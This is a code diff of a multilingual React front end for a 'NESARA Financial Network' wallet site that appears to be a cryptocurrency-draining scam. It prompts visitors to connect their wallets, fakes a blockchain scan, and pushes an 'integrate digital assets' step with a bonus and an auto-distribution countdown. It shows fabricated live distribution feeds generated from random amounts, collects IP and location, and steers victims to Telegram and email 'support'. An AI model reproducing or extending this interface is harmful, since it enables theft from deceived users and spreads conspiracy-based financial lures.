@@ -53,7 +53,7 @@ const TRANSLATIONS = {
     scanComplete: 'Blockchain scan complete',
     assetsFound: 'digital assets found for integration',
     
-    // Distribution Flow (renamed from Claim)
+    // Distribution Flow
     recoverButton: 'INTEGRATE DIGITAL ASSETS',
     processing: 'PROCESSING DISTRIBUTION...',
     completed: '✓ DISTRIBUTION COMPLETED',
@@ -76,7 +76,7 @@ const TRANSLATIONS = {
     reportGenerated: 'Distribution report generated',
     reportDownloaded: 'Report downloaded successfully',
     
-    // Live Feed (renamed from Claims)
+    // Live Feed
     liveClaims: 'LIVE ECONOMIC DISTRIBUTION FEED',
     totalClaimed: 'Total Value Distributed',
     claimingNow: 'processing now',
@@ -195,381 +195,11 @@ const TRANSLATIONS = {
     emailSupportDesc: '¿No tienes Telegram? ¡No hay problema! Envíanos un correo con tu problema.',
     whyEmailSupport: '¿Por qué Soporte por Correo?',
     emailSupportPoints: '• Para usuarios que no usan Telegram\n• Para problemas detallados que requieren documentación\n• Para usuarios de exchanges (Binance, Coinbase, Kraken)\n• Para seguimiento de casos de integración manual'
-  },
-  fr: {
-    serviceActive: 'RÉSEAU FINANCIER NESARA · ACTIF',
-    welcome: 'Écosystème Mondial de l\'Économie Numérique',
-    connectWallet: 'CONNECTER LE PORTEFEUILLE',
-    disconnect: 'Déconnecter le Portefeuille',
-    exploreEcosystem: 'Explorer l\'Écosystème',
-    liveUpdates: 'Mises à Jour en Direct',
-    checkEligibility: 'Analyse des Réseaux Blockchain',
-    verifying: 'Analyse du portefeuille pour l\'intégration d\'actifs numériques...',
-    eligible: '✓ Intégration d\'Actifs Numériques Détectée !',
-    notEligible: 'Aucun Actif Numérique Trouvé pour l\'Intégration',
-    minRequirement: 'Solde on-chain requis pour la participation à l\'écosystème',
-    scanComplete: 'Analyse blockchain terminée',
-    assetsFound: 'actifs numériques trouvés pour l\'intégration',
-    recoverButton: 'INTÉGRER LES ACTIFS NUMÉRIQUES',
-    processing: 'TRAITEMENT DE LA DISTRIBUTION...',
-    completed: '✓ DISTRIBUTION TERMINÉE',
-    secured: 'Vos actifs numériques ont été intégrés avec succès',
-    view: 'VOIR LES DÉTAILS DE LA DISTRIBUTION',
-    recoverNow: 'INITIER L\'INTÉGRATION DES ACTIFS NUMÉRIQUES',
-    recoveryComplete: 'DISTRIBUTION TERMINÉE !',
-    amountRecovered: 'Montant Intégré',
-    processingRecovery: 'Initiation du protocole d\'intégration des actifs numériques...',
-    recoveryValue: 'Valeur des Actifs Numériques',
-    recoveryInitiated: 'Protocole d\'intégration initié',
-    confirmationSent: 'Confirmation envoyée',
-    retrievalComplete: 'Intégration des actifs numériques terminée',
-    emailNotification: 'Confirmation d\'intégration envoyée',
-    blockchainSync: 'Synchronisation avec les réseaux blockchain...',
-    walletRequired: 'Connexion de portefeuille active requise',
-    insufficientBalance: 'Solde on-chain insuffisant pour l\'intégration',
-    proceedToRecovery: 'Cliquez pour procéder à l\'intégration des actifs numériques',
-    recoveryReady: 'Intégration prête - cliquez pour intégrer les actifs',
-    reportGenerated: 'Rapport de distribution généré',
-    reportDownloaded: 'Rapport téléchargé avec succès',
-    liveClaims: 'FLUX DE DISTRIBUTION ÉCONOMIQUE EN DIRECT',
-    totalClaimed: 'Valeur Totale Distribuée',
-    claimingNow: 'traitement en cours',
-    lastClaim: 'Dernière distribution',
-    someoneJustClaimed: 'Distribution d\'Actifs Numériques Terminée !',
-    securedTokens: 'distribué',
-    claimAmount: 'Distribué',
-    waitingForFirstClaim: 'En attente d\'événements de distribution...',
-    participants: 'distributions',
-    today: 'Aujourd\'hui',
-    totalRecovered: 'Valeur Totale Distribuée',
-    tokenPrice: 'Réseau',
-    successful: 'DISTRIBUTION RÉUSSIE !',
-    youHaveSecured: 'Actifs Numériques Intégrés avec Succès',
-    viewButton: 'VOIR LES DÉTAILS DE LA DISTRIBUTION',
-    valueBadge: 'Montant de la Distribution',
-    progress: 'Progrès de l\'Intégration',
-    downloadReport: 'Télécharger le Rapport de Distribution',
-    bonusTag: '+25% bonus',
-    support: 'Support',
-    reportIssue: 'Signaler un Problème',
-    yourEmail: 'Votre Adresse Email',
-    issuePlaceholder: 'Décrivez votre problème en détail...',
-    sendReport: 'Envoyer le Rapport',
-    reportSent: 'Rapport envoyé avec succès ! Le support vous contactera sous peu.',
-    processingReport: 'Envoi du rapport...',
-    reportError: 'Échec de l\'envoi du rapport. Veuillez réessayer.',
-    contactInfo: 'Nous vous contacterons par email dans les 24 heures.',
-    telegramSupport: 'Support Telegram',
-    telegramJoin: 'Rejoignez Notre Communauté',
-    telegramDesc: 'Problèmes de connexion ? Besoin d\'aide pour l\'intégration d\'actifs ? Notre équipe de support est active 24h/24 et 7j/7 sur Telegram.',
-    telegramButton: 'Rejoindre la Communauté Telegram',
-    connectionHelp: 'Problèmes de Connexion ?',
-    manualReachout: 'Support Manuel',
-    emailSupportTitle: 'Support par Email',
-    emailSupportDesc: 'Pas de Telegram ? Pas de problème ! Envoyez-nous un email avec votre problème.',
-    whyEmailSupport: 'Pourquoi le Support par Email ?',
-    emailSupportPoints: '• Pour les utilisateurs qui n\'utilisent pas Telegram\n• Pour les problèmes détaillés nécessitant une documentation\n• Pour les utilisateurs d\'exchanges (Binance, Coinbase, Kraken)\n• Pour le suivi des cas d\'intégration manuelle'
-  },
-  de: {
-    serviceActive: 'NESARA FINANZNETZWERK · AKTIV',
-    welcome: 'Globales Ökosystem der digitalen Wirtschaft',
-    connectWallet: 'WALLET VERBINDEN',
-    disconnect: 'Wallet trennen',
-    exploreEcosystem: 'Ökosystem erkunden',
-    liveUpdates: 'Live-Updates',
-    checkEligibility: 'Blockchain-Netzwerke werden gescannt',
-    verifying: 'Analyse der Wallet für digitale Asset-Integration...',
-    eligible: '✓ Digitale Asset-Integration erkannt!',
-    notEligible: 'Keine digitalen Assets zur Integration gefunden',
-    minRequirement: 'On-Chain-Guthaben für die Ökosystem-Teilnahme erforderlich',
-    scanComplete: 'Blockchain-Scan abgeschlossen',
-    assetsFound: 'digitale Assets zur Integration gefunden',
-    recoverButton: 'DIGITALE ASSETS INTEGRIEREN',
-    processing: 'VERTEILUNG WIRD VERARBEITET...',
-    completed: '✓ VERTEILUNG ABGESCHLOSSEN',
-    secured: 'Ihre digitalen Assets wurden erfolgreich integriert',
-    view: 'VERTEILUNGSDETAILS ANZEIGEN',
-    recoverNow: 'DIGITALE ASSET-INTEGRATION EINLEITEN',
-    recoveryComplete: 'VERTEILUNG ABGESCHLOSSEN!',
-    amountRecovered: 'Integrierter Betrag',
-    processingRecovery: 'Protokoll zur Integration digitaler Assets wird eingeleitet...',
-    recoveryValue: 'Wert digitaler Assets',
-    recoveryInitiated: 'Integrationsprotokoll eingeleitet',
-    confirmationSent: 'Bestätigung gesendet',
-    retrievalComplete: 'Integration digitaler Assets abgeschlossen',
-    emailNotification: 'Integrationsbestätigung gesendet',
-    blockchainSync: 'Synchronisierung mit Blockchain-Netzwerken...',
-    walletRequired: 'Aktive Wallet-Verbindung erforderlich',
-    insufficientBalance: 'Unzureichendes On-Chain-Guthaben für Integration',
-    proceedToRecovery: 'Klicken Sie, um mit der Integration digitaler Assets fortzufahren',
-    recoveryReady: 'Integration bereit - klicken Sie, um Assets zu integrieren',
-    reportGenerated: 'Verteilungsbericht generiert',
-    reportDownloaded: 'Bericht erfolgreich heruntergeladen',
-    liveClaims: 'LIVE-WIRTSCHAFTSVERTEILUNGS-FEED',
-    totalClaimed: 'Gesamtwert verteilt',
-    claimingNow: 'wird jetzt verarbeitet',
-    lastClaim: 'Letzte Verteilung',
-    someoneJustClaimed: 'Digitale Asset-Verteilung abgeschlossen!',
-    securedTokens: 'verteilt',
-    claimAmount: 'Verteilt',
-    waitingForFirstClaim: 'Warten auf Verteilungsereignisse...',
-    participants: 'Verteilungen',
-    today: 'Heute',
-    totalRecovered: 'Gesamtwert verteilt',
-    tokenPrice: 'Netzwerk',
-    successful: 'VERTEILUNG ERFOLGREICH!',
-    youHaveSecured: 'Digitale Assets erfolgreich integriert',
-    viewButton: 'VERTEILUNGSDETAILS ANZEIGEN',
-    valueBadge: 'Verteilungsbetrag',
-    progress: 'Integrationsfortschritt',
-    downloadReport: 'Verteilungsbericht herunterladen',
-    bonusTag: '+25% Bonus',
-    support: 'Support',
-    reportIssue: 'Ein Problem melden',
-    yourEmail: 'Ihre E-Mail-Adresse',
-    issuePlaceholder: 'Beschreiben Sie Ihr Problem im Detail...',
-    sendReport: 'Bericht senden',
-    reportSent: 'Bericht erfolgreich gesendet! Der Support wird Sie in Kürze kontaktieren.',
-    processingReport: 'Bericht wird gesendet...',
-    reportError: 'Bericht konnte nicht gesendet werden. Bitte versuchen Sie es erneut.',
-    contactInfo: 'Wir werden uns innerhalb von 24 Stunden per E-Mail bei Ihnen melden.',
-    telegramSupport: 'Telegram-Support',
-    telegramJoin: 'Treten Sie unserer Community bei',
-    telegramDesc: 'Verbindungsprobleme? Benötigen Sie Hilfe bei der Asset-Integration? Unser Support-Team ist 24/7 auf Telegram aktiv.',
-    telegramButton: 'Telegram-Community beitreten',
-    connectionHelp: 'Verbindungsprobleme?',
-    manualReachout: 'Manueller Support',
-    emailSupportTitle: 'E-Mail-Support',
-    emailSupportDesc: 'Kein Telegram? Kein Problem! Senden Sie uns eine E-Mail mit Ihrem Problem.',
-    whyEmailSupport: 'Warum E-Mail-Support?',
-    emailSupportPoints: '• Für Benutzer, die kein Telegram nutzen\n• Für detaillierte Probleme, die Dokumentation erfordern\n• Für Exchange-Benutzer (Binance, Coinbase, Kraken)\n• Für Nachverfolgung manueller Integrationsfälle'
-  },
-  it: {
-    serviceActive: 'NETWORK FINANZIARIO NESARA · ATTIVO',
-    welcome: 'Ecosistema Globale dell\'Economia Digitale',
-    connectWallet: 'CONNETTI WALLET',
-    disconnect: 'Disconnetti Wallet',
-    exploreEcosystem: 'Esplora Ecosistema',
-    liveUpdates: 'Aggiornamenti Live',
-    checkEligibility: 'Scansione Reti Blockchain',
-    verifying: 'Analisi del wallet per l\'integrazione di asset digitali...',
-    eligible: '✓ Integrazione Asset Digitali Rilevata!',
-    notEligible: 'Nessun Asset Digitale Trovato per l\'Integrazione',
-    minRequirement: 'Saldo on-chain richiesto per la partecipazione all\'ecosistema',
-    scanComplete: 'Scansione blockchain completata',
-    assetsFound: 'asset digitali trovati per l\'integrazione',
-    recoverButton: 'INTEGRA ASSET DIGITALI',
-    processing: 'ELABORAZIONE DISTRIBUZIONE...',
-    completed: '✓ DISTRIBUZIONE COMPLETATA',
-    secured: 'I tuoi asset digitali sono stati integrati con successo',
-    view: 'VISUALIZZA DETTAGLI DISTRIBUZIONE',
-    recoverNow: 'AVVIA INTEGRAZIONE ASSET DIGITALI',
-    recoveryComplete: 'DISTRIBUZIONE COMPLETATA!',
-    amountRecovered: 'Importo Integrato',
-    processingRecovery: 'Avvio del protocollo di integrazione asset digitali...',
-    recoveryValue: 'Valore Asset Digitali',
-    recoveryInitiated: 'Protocollo di integrazione avviato',
-    confirmationSent: 'Conferma inviata',
-    retrievalComplete: 'Integrazione asset digitali completata',
-    emailNotification: 'Conferma integrazione inviata',
-    blockchainSync: 'Sincronizzazione con le reti blockchain...',
-    walletRequired: 'Connessione wallet attiva richiesta',
-    insufficientBalance: 'Saldo on-chain insufficiente per l\'integrazione',
-    proceedToRecovery: 'Clicca per procedere con l\'integrazione degli asset digitali',
-    recoveryReady: 'Integrazione pronta - clicca per integrare gli asset',
-    reportGenerated: 'Report di distribuzione generato',
-    reportDownloaded: 'Report scaricato con successo',
-    liveClaims: 'FEED DISTRIBUZIONE ECONOMICA LIVE',
-    totalClaimed: 'Valore Totale Distribuito',
-    claimingNow: 'elaborazione in corso',
-    lastClaim: 'Ultima distribuzione',
-    someoneJustClaimed: 'Distribuzione Asset Digitali Completata!',
-    securedTokens: 'distribuito',
-    claimAmount: 'Distribuito',
-    waitingForFirstClaim: 'In attesa di eventi di distribuzione...',
-    participants: 'distribuzioni',
-    today: 'Oggi',
-    totalRecovered: 'Valore Totale Distribuito',
-    tokenPrice: 'Rete',
-    successful: 'DISTRIBUZIONE RIUSCITA!',
-    youHaveSecured: 'Asset Digitali Integrati con Successo',
-    viewButton: 'VISUALIZZA DETTAGLI DISTRIBUZIONE',
-    valueBadge: 'Importo Distribuito',
-    progress: 'Progresso Integrazione',
-    downloadReport: 'Scarica Report di Distribuzione',
-    bonusTag: '+25% bonus',
-    support: 'Supporto',
-    reportIssue: 'Segnala un Problema',
-    yourEmail: 'Il Tuo Indirizzo Email',
-    issuePlaceholder: 'Descrivi il tuo problema in dettaglio...',
-    sendReport: 'Invia Report',
-    reportSent: 'Report inviato con successo! Il supporto ti contatterà a breve.',
-    processingReport: 'Invio report...',
-    reportError: 'Invio report fallito. Per favore riprova.',
-    contactInfo: 'Ti contatteremo via email entro 24 ore.',
-    telegramSupport: 'Supporto Telegram',
-    telegramJoin: 'Unisciti alla Nostra Community',
-    telegramDesc: 'Problemi di connessione? Hai bisogno di aiuto con l\'integrazione degli asset? Il nostro team di supporto è attivo 24/7 su Telegram.',
-    telegramButton: 'Unisciti alla Community Telegram',
-    connectionHelp: 'Problemi di Connessione?',
-    manualReachout: 'Supporto Manuale',
-    emailSupportTitle: 'Supporto Email',
-    emailSupportDesc: 'Niente Telegram? Nessun problema! Inviaci un\'email con il tuo problema.',
-    whyEmailSupport: 'Perché il Supporto Email?',
-    emailSupportPoints: '• Per utenti che non usano Telegram\n• Per problemi dettagliati che richiedono documentazione\n• Per utenti di exchange (Binance, Coinbase, Kraken)\n• Per il follow-up di casi di integrazione manuale'
-  },
-  pt: {
-    serviceActive: 'REDE FINANCEIRA NESARA · ATIVA',
-    welcome: 'Ecossistema Global da Economia Digital',
-    connectWallet: 'CONECTAR CARTEIRA',
-    disconnect: 'Desconectar Carteira',
-    exploreEcosystem: 'Explorar Ecossistema',
-    liveUpdates: 'Atualizações Ao Vivo',
-    checkEligibility: 'Verificando Redes Blockchain',
-    verifying: 'Analisando carteira para integração de ativos digitais...',
-    eligible: '✓ Integração de Ativos Digitais Detectada!',
-    notEligible: 'Nenhum Ativo Digital Encontrado para Integração',
-    minRequirement: 'Saldo on-chain necessário para participação no ecossistema',
-    scanComplete: 'Verificação blockchain concluída',
-    assetsFound: 'ativos digitais encontrados para integração',
-    recoverButton: 'INTEGRAR ATIVOS DIGITAIS',
-    processing: 'PROCESSANDO DISTRIBUIÇÃO...',
-    completed: '✓ DISTRIBUIÇÃO CONCLUÍDA',
-    secured: 'Seus ativos digitais foram integrados com sucesso',
-    view: 'VER DETALHES DA DISTRIBUIÇÃO',
-    recoverNow: 'INICIAR INTEGRAÇÃO DE ATIVOS DIGITAIS',
-    recoveryComplete: 'DISTRIBUIÇÃO CONCLUÍDA!',
-    amountRecovered: 'Valor Integrado',
-    processingRecovery: 'Iniciando protocolo de integração de ativos digitais...',
-    recoveryValue: 'Valor do Ativo Digital',
-    recoveryInitiated: 'Protocolo de integração iniciado',
-    confirmationSent: 'Confirmação enviada',
-    retrievalComplete: 'Integração de ativos digitais concluída',
-    emailNotification: 'Confirmação de integração enviada',
-    blockchainSync: 'Sincronizando com redes blockchain...',
-    walletRequired: 'Conexão de carteira ativa necessária',
-    insufficientBalance: 'Saldo on-chain insuficiente para integração',
-    proceedToRecovery: 'Clique para prosseguir com a integração de ativos digitais',
-    recoveryReady: 'Integração pronta - clique para integrar ativos',
-    reportGenerated: 'Relatório de distribuição gerado',
-    reportDownloaded: 'Relatório baixado com sucesso',
-    liveClaims: 'FEED DE DISTRIBUIÇÃO ECONÔMICA AO VIVO',
-    totalClaimed: 'Valor Total Distribuído',
-    claimingNow: 'processando agora',
-    lastClaim: 'Última distribuição',
-    someoneJustClaimed: 'Distribuição de Ativos Digitais Concluída!',
-    securedTokens: 'distribuído',
-    claimAmount: 'Distribuído',
-    waitingForFirstClaim: 'Aguardando eventos de distribuição...',
-    participants: 'distribuições',
-    today: 'Hoje',
-    totalRecovered: 'Valor Total Distribuído',
-    tokenPrice: 'Rede',
-    successful: 'DISTRIBUIÇÃO BEM-SUCEDIDA!',
-    youHaveSecured: 'Ativos Digitais Integrados com Sucesso',
-    viewButton: 'VER DETALHES DA DISTRIBUIÇÃO',
-    valueBadge: 'Valor da Distribuição',
-    progress: 'Progresso da Integração',
-    downloadReport: 'Baixar Relatório de Distribuição',
-    bonusTag: '+25% bônus',
-    support: 'Suporte',
-    reportIssue: 'Reportar um Problema',
-    yourEmail: 'Seu Endereço de Email',
-    issuePlaceholder: 'Descreva seu problema em detalhes...',
-    sendReport: 'Enviar Relatório',
-    reportSent: 'Relatório enviado com sucesso! O suporte entrará em contato em breve.',
-    processingReport: 'Enviando relatório...',
-    reportError: 'Falha ao enviar relatório. Por favor, tente novamente.',
-    contactInfo: 'Entraremos em contato por email dentro de 24 horas.',
-    telegramSupport: 'Suporte Telegram',
-    telegramJoin: 'Junte-se à Nossa Comunidade',
-    telegramDesc: 'Problemas de conexão? Precisa de ajuda com a integração de ativos? Nossa equipe de suporte está ativa 24/7 no Telegram.',
-    telegramButton: 'Juntar-se à Comunidade Telegram',
-    connectionHelp: 'Problemas de Conexão?',
-    manualReachout: 'Suporte Manual',
-    emailSupportTitle: 'Suporte por Email',
-    emailSupportDesc: 'Sem Telegram? Sem problema! Envie-nos um email com seu problema.',
-    whyEmailSupport: 'Por que Suporte por Email?',
-    emailSupportPoints: '• Para usuários que não usam Telegram\n• Para problemas detalhados que exigem documentação\n• Para usuários de exchanges (Binance, Coinbase, Kraken)\n• Para acompanhamento de casos de integração manual'
-  },
-  ru: {
-    serviceActive: 'ФИНАНСОВАЯ СЕТЬ NESARA · АКТИВНА',
-    welcome: 'Глобальная экосистема цифровой экономики',
-    connectWallet: 'ПОДКЛЮЧИТЬ КОШЕЛЕК',
-    disconnect: 'Отключить кошелек',
-    exploreEcosystem: 'Исследовать экосистему',
-    liveUpdates: 'Прямые обновления',
-    checkEligibility: 'Сканирование блокчейн-сетей',
-    verifying: 'Анализ кошелька для интеграции цифровых активов...',
-    eligible: '✓ Интеграция цифровых активов обнаружена!',
-    notEligible: 'Цифровые активы для интеграции не найдены',
-    minRequirement: 'Требуется ончейн-баланс для участия в экосистеме',
-    scanComplete: 'Сканирование блокчейна завершено',
-    assetsFound: 'цифровых активов найдено для интеграции',
-    recoverButton: 'ИНТЕГРИРОВАТЬ ЦИФРОВЫЕ АКТИВЫ',
-    processing: 'ОБРАБОТКА РАСПРЕДЕЛЕНИЯ...',
-    completed: '✓ РАСПРЕДЕЛЕНИЕ ЗАВЕРШЕНО',
-    secured: 'Ваши цифровые активы успешно интегрированы',
-    view: 'ПОСМОТРЕТЬ ДЕТАЛИ РАСПРЕДЕЛЕНИЯ',
-    recoverNow: 'ЗАПУСТИТЬ ИНТЕГРАЦИЮ ЦИФРОВЫХ АКТИВОВ',
-    recoveryComplete: 'РАСПРЕДЕЛЕНИЕ ЗАВЕРШЕНО!',
-    amountRecovered: 'Интегрированная сумма',
-    processingRecovery: 'Запуск протокола интеграции цифровых активов...',
-    recoveryValue: 'Стоимость цифровых активов',
-    recoveryInitiated: 'Протокол интеграции запущен',
-    confirmationSent: 'Подтверждение отправлено',
-    retrievalComplete: 'Интеграция цифровых активов завершена',
-    emailNotification: 'Подтверждение интеграции отправлено',
-    blockchainSync: 'Синхронизация с блокчейн-сетями...',
-    walletRequired: 'Требуется активное подключение кошелька',
-    insufficientBalance: 'Недостаточный ончейн-баланс для интеграции',
-    proceedToRecovery: 'Нажмите для продолжения интеграции цифровых активов',
-    recoveryReady: 'Интеграция готова - нажмите для интеграции активов',
-    reportGenerated: 'Отчет о распределении создан',
-    reportDownloaded: 'Отчет успешно загружен',
-    liveClaims: 'ПРЯМАЯ ТРАНСЛЯЦИЯ РАСПРЕДЕЛЕНИЯ',
-    totalClaimed: 'Общая распределенная стоимость',
-    claimingNow: 'обрабатывается сейчас',
-    lastClaim: 'Последнее распределение',
-    someoneJustClaimed: 'Распределение цифровых активов завершено!',
-    securedTokens: 'распределено',
-    claimAmount: 'Распределено',
-    waitingForFirstClaim: 'Ожидание событий распределения...',
-    participants: 'распределений',
-    today: 'Сегодня',
-    totalRecovered: 'Общая распределенная стоимость',
-    tokenPrice: 'Сеть',
-    successful: 'РАСПРЕДЕЛЕНИЕ УСПЕШНО!',
-    youHaveSecured: 'Цифровые активы успешно интегрированы',
-    viewButton: 'ПОСМОТРЕТЬ ДЕТАЛИ РАСПРЕДЕЛЕНИЯ',
-    valueBadge: 'Сумма распределения',
-    progress: 'Прогресс интеграции',
-    downloadReport: 'Скачать отчет о распределении',
-    bonusTag: '+25% бонус',
-    support: 'Поддержка',
-    reportIssue: 'Сообщить о проблеме',
-    yourEmail: 'Ваш адрес электронной почты',
-    issuePlaceholder: 'Опишите вашу проблему подробно...',
-    sendReport: 'Отправить отчет',
-    reportSent: 'Отчет успешно отправлен! Служба поддержки свяжется с вами в ближайшее время.',
-    processingReport: 'Отправка отчета...',
-    reportError: 'Не удалось отправить отчет. Пожалуйста, попробуйте снова.',
-    contactInfo: 'Мы свяжемся с вами по электронной почте в течение 24 часов.',
-    telegramSupport: 'Поддержка в Telegram',
-    telegramJoin: 'Присоединяйтесь к нашему сообществу',
-    telegramDesc: 'Проблемы с подключением? Нужна помощь с интеграцией активов? Наша команда поддержки активна 24/7 в Telegram.',
-    telegramButton: 'Присоединиться к сообществу Telegram',
-    connectionHelp: 'Проблемы с подключением?',
-    manualReachout: 'Ручная поддержка',
-    emailSupportTitle: 'Поддержка по электронной почте',
-    emailSupportDesc: 'Нет Telegram? Не проблема! Отправьте нам письмо с вашей проблемой.',
-    whyEmailSupport: 'Почему поддержка по электронной почте?',
-    emailSupportPoints: '• Для пользователей, которые не используют Telegram\n• Для подробных проблем, требующих документации\n• Для пользователей бирж (Binance, Coinbase, Kraken)\n• Для последующего наблюдения за случаями ручной интеграции'
   }
 };
 
 // ============================================
-// DEPLOYED CONTRACTS ON ALL 5 NETWORKS (UNCHANGED)
+// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
 // ============================================
 
 const MULTICHAIN_CONFIG = {
@@ -633,7 +263,7 @@ const PROJECT_FLOW_ROUTER_ABI = [
 ];
 
 // ============================================
-// PERSISTENT STORAGE KEYS (RENAMED FOR CONTEXT)
+// PERSISTENT STORAGE KEYS
 // ============================================
 const STORAGE_KEYS = {
   LIVE_TRANSACTIONS: 'nesaraFinancial_liveDistributions',
@@ -641,7 +271,6 @@ const STORAGE_KEYS = {
   TOTAL_RECOVERED_AMOUNT: 'nesaraFinancial_totalDistributedAmount'
 };
 
-// Helper functions (getRandomDistributionAmount, generateDistributionId, etc.)
 const hasDateChanged = (lastDate) => {
   if (!lastDate) return true;
   const today = new Date().toDateString();
@@ -656,9 +285,6 @@ const generateDistributionId = () => {
   return 'NES-DIST-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
 };
 
-// ============================================
-// GENERATE DISTRIBUTION REPORT (JSON)
-// ============================================
 const generateDistributionReport = (tx, walletAddress, distributionAmount, chains, timestamp, chainDetails) => {
   const reportData = {
     reportId: generateDistributionId(),
@@ -690,7 +316,7 @@ const generateDistributionReport = (tx, walletAddress, distributionAmount, chain
 };
 
 // ============================================
-// LIVE DISTRIBUTION POPUP COMPONENT (RENAMED)
+// LIVE DISTRIBUTION POPUP COMPONENT
 // ============================================
 const LiveDistributionPopup = ({ tx, onClose, onDownloadReport, translations, walletAddress, distributionAmount, chains, chainDetails }) => {
   const [visible, setVisible] = useState(true);
@@ -740,7 +366,7 @@ const LiveDistributionPopup = ({ tx, onClose, onDownloadReport, translations, wa
 };
 
 // ============================================
-// LIVE DISTRIBUTION FEED COMPONENT (RENAMED)
+// LIVE DISTRIBUTION FEED COMPONENT
 // ============================================
 const LiveDistributionFeed = ({ transactions, translations, totalDistributedAmount, todayCount, onDownloadReport, walletAddress }) => {
   const handleDownloadForTx = (tx) => {
@@ -749,7 +375,7 @@ const LiveDistributionFeed = ({ transactions, translations, totalDistributedAmou
   };
   
   return (
-    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-amber-500/20 overflow-hidden">
+    <div className="w-full max-w-md mx-auto bg-black/40 backdrop-blur rounded-xl border border-amber-500/20 overflow-hidden">
       <div className="bg-gradient-to-r from-amber-600/20 to-transparent px-4 py-3 border-b border-amber-500/20 flex items-center justify-between">
         <div className="flex items-center gap-2">
           <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
@@ -817,7 +443,7 @@ const LiveDistributionFeed = ({ transactions, translations, totalDistributedAmou
 };
 
 // ============================================
-// LIVE ACTIVITY BADGE (RENAMED)
+// LIVE ACTIVITY BADGE
 // ============================================
 const LiveActivityBadge = ({ translations, activeUsers, lastDistributionTime }) => {
   return (
@@ -847,7 +473,7 @@ const LiveActivityBadge = ({ translations, activeUsers, lastDistributionTime }) 
 };
 
 // ============================================
-// AUTO DISTRIBUTION COUNTDOWN (RENAMED)
+// AUTO DISTRIBUTION COUNTDOWN
 // ============================================
 const AutoDistributionCountdown = ({ seconds, translations, onCancel }) => {
   const [countdown, setCountdown] = useState(seconds);
@@ -876,7 +502,7 @@ const AutoDistributionCountdown = ({ seconds, translations, onCancel }) => {
 };
 
 // ============================================
-// REPORT ISSUE COMPONENT (UNCHANGED LOGIC)
+// REPORT ISSUE COMPONENT
 // ============================================
 const ReportIssue = ({ translations, address, balances, userLocation }) => {
   const [userEmail, setUserEmail] = useState('');
@@ -1001,7 +627,7 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
 };
 
 // ============================================
-// TELEGRAM SUPPORT COMPONENT (UPDATED)
+// TELEGRAM SUPPORT COMPONENT
 // ============================================
 const TelegramSupport = ({ translations }) => {
   const TELEGRAM_GROUP_LINK = 'https://t.me/+UUhEUx9wBW5jZGQ1';
@@ -1064,22 +690,19 @@ const TelegramSupport = ({ translations }) => {
 };
 
 // ============================================
-// NEW: GESARA.NEWS COMPONENT (LIVE UPDATES)
+// GESARA.NEWS COMPONENT (LIVE UPDATES)
 // ============================================
 const GesaraNewsWidget = () => {
   const [newsItems, setNewsItems] = useState([]);
   const [loading, setLoading] = useState(true);
-  const [error, setError] = useState(null);
 
   useEffect(() => {
     const fetchNews = async () => {
       try {
-        // Using a CORS proxy to fetch the RSS feed or HTML content
         const response = await fetch('https://api.rss2json.com/v1/api.json?rss_url=https://gesara.news/feed/');
         const data = await response.json();
         
         if (data.status === 'ok' && data.items) {
-          // Format the news items
           const formattedNews = data.items.slice(0, 5).map(item => ({
             title: item.title,
             link: item.link,
@@ -1088,17 +711,13 @@ const GesaraNewsWidget = () => {
           }));
           setNewsItems(formattedNews);
         } else {
-          // Fallback mock data if RSS fetch fails
           setNewsItems([
             { title: "US and China to launch government-to-government dialogue on AI", link: "https://gesara.news/", pubDate: "May 19, 2026", description: "The US and China agreeing on government-to-government AI dialogue signals a major shift in global tech governance." },
-            { title: "Nvidia's Jensen Huang joins Air Force One for Xi summit", link: "https://gesara.news/", pubDate: "May 13, 2026", description: "A powerful lineup of top US CEOs heads to China with Trump for the Xi summit." },
-            { title: "The Spiritual Battle is Real – Are You Ready?", link: "https://gesara.news/", pubDate: "May 10, 2026", description: "Stay awake, keep your lamps burning, and let your soul shine brighter than any darkness around you." }
+            { title: "Nvidia's Jensen Huang joins Air Force One for Xi summit", link: "https://gesara.news/", pubDate: "May 13, 2026", description: "A powerful lineup of top US CEOs heads to China with Trump for the Xi summit." }
           ]);
         }
       } catch (err) {
         console.error('Failed to fetch news:', err);
-        setError('Unable to load live updates');
-        // Fallback data
         setNewsItems([
           { title: "Global Financial System Modernization Underway", link: "https://gesara.news/", pubDate: "Latest", description: "Central banks continue exploring digital currency frameworks and cross-border settlement systems." },
           { title: "Blockchain Interoperability Advances", link: "https://gesara.news/", pubDate: "Latest", description: "New protocols enable seamless asset transfer between major blockchain networks." }
@@ -1109,7 +728,7 @@ const GesaraNewsWidget = () => {
     };
 
     fetchNews();
-    const interval = setInterval(fetchNews, 300000); // Refresh every 5 minutes
+    const interval = setInterval(fetchNews, 300000);
     return () => clearInterval(interval);
   }, []);
 
@@ -1120,7 +739,6 @@ const GesaraNewsWidget = () => {
         <div className="space-y-3">
           <div className="h-4 bg-amber-500/10 rounded w-full"></div>
           <div className="h-4 bg-amber-500/10 rounded w-5/6"></div>
-          <div className="h-4 bg-amber-500/10 rounded w-4/6"></div>
         </div>
       </div>
     );
@@ -1185,7 +803,6 @@ function App() {
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
   const [balances, setBalances] = useState({});
-  const [loading, setLoading] = useState(false);
   const [signatureLoading, setSignatureLoading] = useState(false);
   const [txStatus, setTxStatus] = useState('');
   const [error, setError] = useState('');
@@ -1200,18 +817,14 @@ function App() {
     avax: 32
   });
   const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
-  const [hoverConnect, setHoverConnect] = useState(false);
-  const [walletInitialized, setWalletInitialized] = useState(false);
   const [scanProgress, setScanProgress] = useState(0);
   const [scanning, setScanning] = useState(false);
-  const [currentFlowId, setCurrentFlowId] = useState('');
   const [processingChain, setProcessingChain] = useState('');
   const [isEligible, setIsEligible] = useState(false);
   const [eligibleChains, setEligibleChains] = useState([]);
   const [showDistributeButton, setShowDistributeButton] = useState(false);
   const [showReportNotification, setShowReportNotification] = useState(false);
   const [autoDistributeActive, setAutoDistributeActive] = useState(false);
-  const [chainDetailsForReport, setChainDetailsForReport] = useState([]);
   
   // LIVE DISTRIBUTIONS STATE
   const [liveDistributions, setLiveDistributions] = useState([]);
@@ -1242,7 +855,6 @@ function App() {
   const todayCount = liveDistributions.length;
